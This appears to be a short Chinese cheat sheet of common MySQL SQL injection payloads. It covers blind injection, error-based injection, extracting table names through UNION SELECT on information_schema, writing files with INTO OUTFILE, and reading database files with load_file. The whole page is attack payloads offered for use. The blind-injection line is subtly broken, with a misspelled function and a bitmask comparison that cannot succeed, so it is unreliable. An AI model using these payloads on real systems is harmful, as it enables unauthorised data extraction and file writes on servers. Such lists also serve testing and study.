常用Payload
================================


盲注

::

    ascii(subtring(str,pos,length)) & 32 == 1

报错注入

::

    select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;


获取表名

::

    union select table_name,2,3,4 from information_schema.tables where table_schema = database()

写文件

::

    union select 1,1,1 into outfile '/demo.txt'

读文件

::

    select @@datadir
    select load_file('databasename/tablename.MYD')
